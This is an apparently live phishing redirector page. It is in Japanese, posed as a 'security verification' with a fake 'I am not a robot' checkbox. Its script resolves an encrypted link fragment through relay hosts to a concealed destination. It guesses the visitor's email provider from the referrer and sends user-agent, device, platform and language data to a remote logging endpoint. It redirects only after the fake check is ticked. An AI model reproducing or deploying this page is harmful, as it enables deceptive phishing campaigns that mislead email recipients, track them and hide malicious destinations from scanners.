<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>セキュリティ確認</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="robots" content="noindex,nofollow" />
  <style>
    body{font-family:"Noto Sans JP",sans-serif;background:#f6f9fc;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
    .card{background:#fff;border:1px solid #e5e9ef;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.05);padding:28px;max-width:420px;width:92%;}
    h1{font-size:18px;margin:0 0 8px}
    p{color:#666;margin:4px 0}
    .loader{border:5px solid #f3f3f3;border-top:5px solid #3498db;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin:18px auto;display:none}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    label{display:flex;align-items:center;gap:8px;margin-top:12px}
    input[type=checkbox]{transform:scale(1.3)}
    button{margin-top:16px;padding:10px 18px;border:0;border-radius:6px;background:#6b7280;color:#fff;cursor:not-allowed}
    button.enabled{background:#2563eb;cursor:pointer}
    .msg{margin-top:12px;font-size:13px;color:#059669;display:none}
    .err{color:#dc2626}
    small{display:block;margin-top:16px;color:#9ca3af}
  </style>
</head>
<body>
  <div class="card">
    <h1>セキュリティ確認中...</h1>
    <p id="step">リンクを検証しています。しばらくお待ちください。</p>
    <div class="loader" id="loader"></div>

    <div id="verify" style="display:none;">
      <label><input type="checkbox" id="chk" />私はロボットではありません</label>
      <button id="goBtn" disabled>続行</button>
      <div class="msg" id="ok">✅ 検証に成功しました。リダイレクト中...</div>
      <p class="err" id="err" style="display:none;"></p>
    </div>

    <small>Cloud Edge Verification</small>
  </div>

  <script>
    /* ========== 多中继配置：可增删，顺序随机 + 记忆上次可用 ========== */
    const RELAYS = [
      "https://zhongji-wb3.pages.dev",
      "https://zhongji-wb3.pages.dev",
      "https://zhongji-wb3.pages.dev"
    ];
    const ENDPOINT_RESOLVE = "/api/resolve";
    const ENDPOINT_LOG = "/api/log"; // 新增：日志上报到中继

    /* =================== 小工具 =================== */
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
    function withTimeout(promise, ms=7000){
      return Promise.race([
        promise,
        new Promise((_,rej)=>setTimeout(()=>rej(new Error("timeout")),ms))
      ]);
    }
    function nowIso(){return new Date().toISOString()}

    // 设备/邮箱推断
    function isMobileUA(ua){
      ua = ua.toLowerCase();
      return /(iphone|android|ipad|ipod|mobile)/.test(ua);
    }
    function guessEmailProvider(ref){
      try{
        if(!ref) return "unknown";
        const h = new URL(ref).hostname;
        const map = [
          [/mail\.google\.com|gmail\.com/, "gmail"],
          [/outlook\.live\.com|outlook\.office|office\.com|live\.com|hotmail\.com/, "outlook/hotmail"],
          [/mail\.yahoo\.co\.jp|mail\.yahoo\.com|yahoo\.co\.jp/, "yahoo"],
          [/icloud\.com|mail\.me\.com/, "icloud"],
          [/docomo\.ne\.jp|webmail\.sp-mode\.ne\.jp/, "docomo"],
          [/ezweb\.ne\.jp|au\.com/, "au/ezweb"],
          [/softbank\.ne\.jp|i\.softbank\.jp|vodafone\.ne\.jp/, "softbank"],
          [/rakuten\.co\.jp|rakuten/, "rakuten"],
          [/nifty\.com/, "nifty"],
          [/goo\.ne\.jp/, "goo"],
          [/mail|webmail/, "webmail"]
        ];
        for(const [re,label] of map){ if(re.test(h)) return label + " ("+h+")"; }
        return h;
      }catch{return "unknown";}
    }

    async function postLog(relay, payload){
      try{
        await withTimeout(fetch(relay + ENDPOINT_LOG, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          credentials: "omit",
          cache: "no-store"
        }), 6000);
      }catch(_){/* ignore */}
    }

    /* =================== 主流程 =================== */
    (async () => {
      const step = document.getElementById('step');
      const loader = document.getElementById('loader');
      const verifyBox = document.getElementById('verify');
      const chk = document.getElementById('chk');
      const goBtn = document.getElementById('goBtn');
      const ok = document.getElementById('ok');
      const err = document.getElementById('err');

      // 先用上次成功的中继，其次随机
      const lastGood = localStorage.getItem("relay:last_good");
      const relays = RELAYS.slice();
      if (lastGood && relays.includes(lastGood)) {
        relays.splice(relays.indexOf(lastGood), 1);
        relays.unshift(lastGood);
      } else {
        shuffle(relays);
      }

      loader.style.display = 'block';

      // 取 fragment：这是“加密ID”
      const encId = (location.hash || '').replace(/^#/, '').trim();

      // 无 fragment：立即记录日志并停止（不兜底、不重试）
      if (!encId) {
        loader.style.display = 'none';
        step.innerText = '無効なリンクです。';

        const ua = navigator.userAgent || "";
        const payload = {
          type: "missing_fragment",
          when: nowIso(),
          page: location.href,
          referrer: document.referrer || "",
          email_provider: guessEmailProvider(document.referrer || ""),
          ua,
          device: isMobileUA(ua) ? "mobile" : "desktop",
          platform: navigator.platform || "",
          language: navigator.language || "",
        };
        // 尝试所有中继上报一次
        for(const r of relays){ postLog(r, payload); }
        return;
      }

      // 逐个尝试中继解析
      let target = null, lastError = null, usedRelay = null;
      for (const relay of relays) {
        try {
          const url = `${relay}${ENDPOINT_RESOLVE}?enc=${encodeURIComponent(encId)}&t=${Date.now()}&r=${Math.random().toString(36).slice(2)}`;
          const r = await withTimeout(fetch(url, { method: 'GET', credentials: 'omit', cache: 'no-store' }), 7000);
          if (!r.ok) throw new Error('HTTP ' + r.status);
          const j = await r.json();
          if (j && j.url) {
            target = j.url;
            usedRelay = relay;
            localStorage.setItem("relay:last_good", relay);
            break;
          } else {
            throw new Error(j?.error || "invalid_response");
          }
        } catch (e) {
          lastError = e.message || String(e);
          await sleep(120 + Math.random()*200);
          // 不兜底：只是继续尝试下一个中继
          continue;
        }
      }

      if (!target) {
        loader.style.display = 'none';
        step.innerText = 'リンクの検証に失敗しました。';
        err.style.display = 'block';
        err.innerText = 'エラー: ' + (lastError || 'unknown');

        // 解析失败日志
        const ua = navigator.userAgent || "";
        const payload = {
          type: "resolve_failed",
          when: nowIso(),
          page: location.href,
          referrer: document.referrer || "",
          email_provider: guessEmailProvider(document.referrer || ""),
          ua,
          device: isMobileUA(ua) ? "mobile" : "desktop",
          platform: navigator.platform || "",
          language: navigator.language || "",
          encId,
          error: lastError || "unknown"
        };
        for(const r of relays){ postLog(r, payload); }
        return;
      }

      // 显示勾选再跳（成功路径不记录日志）
      loader.style.display = 'none';
      step.innerText = '手動確認が必要です。チェックを入れて続行してください。';
      verifyBox.style.display = 'block';

      chk.addEventListener('change', () => {
        const okk = !!chk.checked;
        goBtn.disabled = !okk;
        goBtn.classList.toggle('enabled', okk);
      });

      goBtn.addEventListener('click', () => {
        goBtn.disabled = true;
        ok && (ok.style.display = 'block');
        const a = document.createElement('a');
        a.href = target;
        a.rel = 'noreferrer noopener';
        document.body.appendChild(a);
        a.click();
      });
    })();
  </script>
</body>
</html>
